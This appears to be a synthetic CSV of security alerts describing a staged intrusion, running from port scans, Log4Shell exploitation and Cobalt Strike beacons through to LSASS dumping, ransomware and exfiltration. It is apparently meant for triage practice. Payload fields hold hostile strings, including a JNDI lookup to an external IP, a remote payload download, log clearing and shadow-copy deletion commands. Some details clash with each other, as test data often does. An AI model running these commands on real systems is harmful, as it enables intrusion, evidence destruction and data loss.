alert_id,timestamp,source_ip,destination_ip,destination_port,alert_name,severity,category,rule_id,asset_tags,raw_payload,analyst_notes
ALERT-001,2026-04-06T05:02:11Z,185.220.101.47,10.0.1.1,0,External SYN scan against perimeter — 4096 ports,critical,recon,RECON-001,server,"{""ports_scanned"":4096,""scan_type"":""SYN"",""duration_sec"":8}","High-rate scan from known Tor exit; precedes most intrusion chains in threat intel"
ALERT-002,2026-04-06T05:06:33Z,185.220.101.47,10.0.1.45,443,Phishing payload delivered via HTTPS,critical,phishing,PHISH-001,"server,dc","{""url"":""https://office365-update.ru/payload.exe"",""user_agent"":""curl/7.81""}","Confirmed malicious domain; payload is a known Cobalt Strike stager"
ALERT-003,2026-04-06T05:09:47Z,185.220.101.47,10.0.1.45,4444,Cobalt Strike beacon — reverse shell established,critical,malware,C2-001,"server,dc","{""proto"":""tcp"",""bytes"":8400,""beacon_interval_sec"":60}","Beacon matches CS default profile; C2 over port 4444"
ALERT-004,2026-04-06T05:11:22Z,185.220.101.47,10.0.1.8,445,SMB lateral movement from compromised host,critical,lateral_movement,SMB-001,"server,dc","{""shares_accessed"":[""ADMIN$"",""C$""],""method"":""PsExec""}","Pass-the-hash via PsExec; source host confirmed compromised"
ALERT-005,2026-04-06T05:13:58Z,185.220.101.47,10.0.1.8,0,LSASS memory dumped on domain controller,critical,malware,CRED-001,"server,dc","{""proc"":""lsass.exe"",""parent"":""rundll32.exe"",""bytes_read"":52428800}","Credential harvesting from DC memory; NTLM hashes likely extracted"
ALERT-006,2026-04-06T05:16:04Z,185.220.101.47,45.142.212.100,443,Large encrypted outbound transfer to C2 host,critical,data_exfil,EXFIL-001,"server,dc","{""bytes"":1073741824,""duration_sec"":420,""dst_asn"":""AS206728""}","1GB exfil over 7 min; destination is bulletproof hosting provider"
ALERT-007,2026-04-06T04:51:03Z,10.0.1.15,10.0.1.1,389,New privileged account created outside change window,critical,malware,PRIV-001,"server,dc","{""username"":""svc_deploy2"",""groups"":""Domain Admins"",""created_by"":""jmartinez""}","Account created at 04:51 UTC; no change request filed"
ALERT-008,2026-04-06T04:54:17Z,10.0.1.15,10.0.1.1,0,Scheduled task registered for persistence,high,malware,PERSIST-001,"server,dc","{""task_name"":""WindowsSecurityHealth"",""trigger"":""AtLogon"",""action"":""C:\\Temp\\update.exe""}","Task binary in Temp; not signed; matches known implant dropper"
ALERT-009,2026-04-06T04:57:44Z,10.0.1.15,10.0.1.1,0,Security event logs cleared on domain controller,critical,malware,LOG-001,"server,dc","{""cmdline"":""wevtutil cl Security"",""cleared_events"":14293}","14293 events wiped; standard attacker anti-forensics step"
ALERT-010,2026-04-06T05:00:29Z,10.0.1.15,10.0.1.5,445,Shadow copy deletion across all drives,critical,malware,RAN-002,"server,dc","{""cmdline"":""vssadmin delete shadows /all /quiet"",""drives_affected"":4}","Ransomware pre-encryption step; backup destruction confirmed"
ALERT-011,2026-04-06T05:03:12Z,10.0.1.15,198.98.56.76,443,Compressed archive staged for exfiltration,critical,data_exfil,EXFIL-002,"server,dc","{""file"":""\\\\DC01\\SYSVOL\\archive.7z"",""size_mb"":890,""dst"":""198.98.56.76""}","SYSVOL archive contains GPO scripts and service account configs"
ALERT-012,2026-04-06T04:44:19Z,45.142.212.100,10.0.0.1,0,Aggressive reconnaissance scan — full port range,high,recon,RECON-002,server,"{""ports_scanned"":65535,""scan_type"":""CONNECT"",""duration_sec"":22}","Full TCP connect scan; source appears in multiple threat feeds"
ALERT-013,2026-04-06T04:46:51Z,45.142.212.100,10.0.1.45,80,Exploit attempt against public-facing web service,critical,malware,PROC-001,server,"{""cve"":""CVE-2021-44228"",""payload"":""${jndi:ldap://45.142.212.100/a}"",""waf_blocked"":false}","Log4Shell exploit; WAF did not block; application may be vulnerable"
ALERT-014,2026-04-06T04:49:38Z,45.142.212.100,10.0.1.45,0,Web shell written to document root,critical,malware,SCRIPT-001,server,"{""path"":""/var/www/html/status.php"",""hash"":""d41d8cd98f00b204e9800998ecf8427e"",""method"":""POST""}","PHP web shell detected; attacker achieved RCE via Log4Shell"
ALERT-015,2026-04-06T04:52:44Z,45.142.212.100,10.0.1.45,0,Ransomware encryption process started,critical,malware,RAN-001,server,"{""ext_count"":2841,""ext"":"".enc"",""rate_per_sec"":47}","2841 files encrypted in 60 seconds; matches LockBit 3.0 IOC pattern"
ALERT-016,2026-04-06T04:32:07Z,91.108.4.0,10.0.2.18,443,C2 beacon — low and slow outbound,high,c2,C2-002,"workstation,endpoint","{""beacon_interval_sec"":300,""jitter_pct"":20,""bytes_per_beacon"":840}","Beaconing pattern consistent with Sliver C2; 5-min interval with 20% jitter"
ALERT-017,2026-04-06T04:37:22Z,91.108.4.0,10.0.2.18,443,C2 task received — file download staged,high,c2,C2-003,"workstation,endpoint","{""task_type"":""download"",""filename"":""stage2.bin"",""size_bytes"":204800}","200KB binary staged in AppData; matches post-exploitation toolkit signature"
ALERT-018,2026-04-06T04:38:55Z,91.108.4.0,10.0.2.18,443,DNS over HTTPS tunnel established,high,c2,DNS-001,"workstation,endpoint","{""doh_provider"":""cloudflare"",""query_rate_per_min"":42,""entropy"":4.8}","High-entropy DoH queries; likely C2 tunneling over encrypted DNS"
ALERT-019,2026-04-06T04:15:33Z,10.0.2.22,10.0.1.1,22,SSH brute force — 480 failures in 90 seconds,high,malware,BF-001,server,"{""failed_logins"":480,""window_sec"":90,""unique_passwords"":480}","Dictionary attack against SSH; no successful auth observed"
ALERT-020,2026-04-06T03:58:44Z,10.0.2.40,45.155.205.233,4444,Suspicious outbound on Metasploit default port,high,c2,C2-004,"workstation,endpoint","{""proto"":""tcp"",""bytes"":3200,""session_count"":4}","Port 4444 not in approved outbound policy; 4 sessions to same external host"
ALERT-021,2026-04-06T03:44:17Z,10.0.2.55,91.108.4.0,53,DNS tunneling — high-entropy queries,high,c2,DNS-002,"workstation,endpoint","{""query_len_avg"":63,""unique_subdomains"":412,""ttl_avg_sec"":5}","412 unique subdomains queried; TTL of 5s suggests fast-flux C2"
ALERT-022,2026-04-06T03:29:51Z,10.0.2.60,10.0.1.9,445,Mimikatz execution signature matched,high,malware,MAL-001,"workstation,endpoint","{""sig"":""sekurlsa::logonpasswords"",""confidence"":0.99,""process"":""svchost.exe""}","Mimikatz injected into svchost; AV caught memory artifact post-execution"
ALERT-023,2026-04-06T03:14:08Z,10.0.2.18,10.0.1.5,3389,RDP session opened outside business hours,medium,lateral_movement,RDP-001,"workstation,endpoint","{""user"":""bwilliams"",""login_time"":""03:14"",""src_country"":""RU""}","RDP from Russian IP geolocated; user bwilliams not on call rotation"
ALERT-024,2026-04-06T02:58:33Z,10.0.3.10,10.0.1.0,0,Internal subnet sweep from workstation,medium,recon,RECON-003,"workstation,endpoint","{""ports_scanned"":512,""target_range"":""10.0.1.0/24"",""hosts_found"":14}","14 live hosts found; unusual for this workstation segment"
ALERT-025,2026-04-06T02:41:22Z,10.0.3.20,198.98.56.76,443,Anomalous outbound data volume — 5x baseline,medium,data_exfil,EXFIL-003,"workstation,endpoint","{""bytes_out"":52428800,""baseline_bytes"":10485760,""threshold_multiplier"":5}","5x normal outbound; DLP alert triggered; destination not in approved list"
ALERT-026,2026-04-06T02:22:19Z,10.0.3.25,10.0.1.5,0,Office macro spawning cmd.exe child process,medium,malware,PROC-002,"workstation,endpoint","{""parent"":""winword.exe"",""child"":""cmd.exe"",""cmdline"":""cmd /c whoami > C:\\Temp\\out.txt""}","Classic macro execution pattern; user opened email attachment"
ALERT-027,2026-04-06T02:05:44Z,10.0.3.30,10.0.1.1,135,WMI subscription created for persistence,medium,malware,PERSIST-002,"workstation,endpoint","{""consumer"":""CommandLineEventConsumer"",""filter"":""SELECT * FROM __InstanceModificationEvent"",""action"":""powershell.exe -enc ...""}","WMI subscription triggers PS on system event; fileless persistence"
ALERT-028,2026-04-06T01:48:11Z,10.0.3.35,10.0.1.10,0,BITS job used to download external payload,medium,malware,BITS-001,"workstation,endpoint","{""url"":""http://185.220.101.47/update.bin"",""size_bytes"":2097152,""priority"":""FOREGROUND""}","BITS used to evade proxy; destination matches active C2 campaign"
ALERT-029,2026-04-06T01:31:55Z,10.0.3.40,10.0.1.1,0,Netsh used to open port 4444 in host firewall,medium,malware,FW-001,"workstation,endpoint","{""rule_name"":""AllowAll4444"",""direction"":""inbound"",""protocol"":""TCP""}","Firewall rule added without admin rights via UAC bypass"
ALERT-030,2026-04-06T01:14:08Z,10.0.3.45,10.0.1.12,0,New service binary written to System32,medium,malware,PERSIST-003,"workstation,endpoint","{""binary"":""C:\\Windows\\System32\\wuauctl.exe"",""signed"":false,""hash"":""badc0ffee""}","Binary impersonates Windows Update; not signed; written by winword.exe"
ALERT-031,2026-04-06T00:57:33Z,10.0.3.50,10.0.1.1,445,Large archive staged for lateral exfiltration,medium,data_exfil,EXFIL-004,"workstation,endpoint","{""file"":""C:\\Users\\Public\\backup.zip"",""size_mb"":340,""created_by"":""jsmith""}","340MB archive contains HR and finance documents"
ALERT-032,2026-04-06T00:38:17Z,10.0.3.55,10.0.1.5,0,USB mass storage device in restricted zone,medium,other,USB-001,"workstation,endpoint","{""device"":""SanDisk Ultra 128GB"",""zone"":""finance"",""user"":""dlee""}","Finance zone policy prohibits removable media; DLP notification triggered"
ALERT-033,2026-04-05T23:12:44Z,192.168.10.5,10.0.1.1,0,Endpoint running full port scan against DC,low,recon,RECON-004,endpoint,"{""target"":""10.0.1.1"",""ports"":65535,""tool_sig"":""nmap""}","nmap signature detected; user claims running security scanner"
ALERT-034,2026-04-05T22:47:33Z,192.168.1.100,10.0.1.1,0,Antivirus definitions 9 days out of date,low,other,AV-001,"workstation,endpoint","{""av_product"":""Defender"",""last_update"":""2026-03-28"",""days_stale"":9}",""
ALERT-035,2026-04-05T21:33:19Z,192.168.1.101,10.0.1.1,514,Syslog source silent for 18 minutes,low,other,LOG-002,server,"{""log_source"":""firewall-01"",""silent_since"":""2026-04-05T21:15:00Z"",""expected_interval_sec"":60}",""
ALERT-036,2026-04-05T20:14:52Z,192.168.1.102,192.168.1.1,0,First login from unrecognized device,low,other,AUTH-001,endpoint,"{""user"":""cjones"",""device_id"":""LAPTOP-UNK9"",""first_seen"":true,""enrolled"":false}",""
ALERT-037,2026-04-05T18:58:44Z,192.168.1.103,10.0.1.1,0,Scheduled task modified by non-owner,low,other,PERSIST-004,endpoint,"{""task_name"":""Adobe Acrobat Update Task"",""modified_by"":""asmith"",""owner"":""SYSTEM""}",""
ALERT-038,2026-04-05T17:30:17Z,192.168.1.104,10.0.1.1,0,Unapproved browser extension installed,low,other,EXT-001,"workstation,endpoint","{""extension"":""ZenMate Free VPN"",""browser"":""Chrome"",""user"":""rwhite"",""store"":""unofficial""}",""
ALERT-039,2026-04-05T16:22:08Z,192.168.1.105,10.0.1.1,0,Screen lock policy disabled on workstation,low,other,POL-001,workstation,"{""user"":""mthomas"",""policy"":""CIS-2.3.1"",""gpo_override"":true}",""
ALERT-040,2026-04-05T15:11:26Z,192.168.1.106,10.0.1.5,22,Repeated login failures — 8 attempts same user,low,other,AUTH-002,endpoint,"{""user"":""jdoe"",""attempts"":8,""window_min"":5,""last_failure"":""2026-04-05T15:10:59Z""}",""
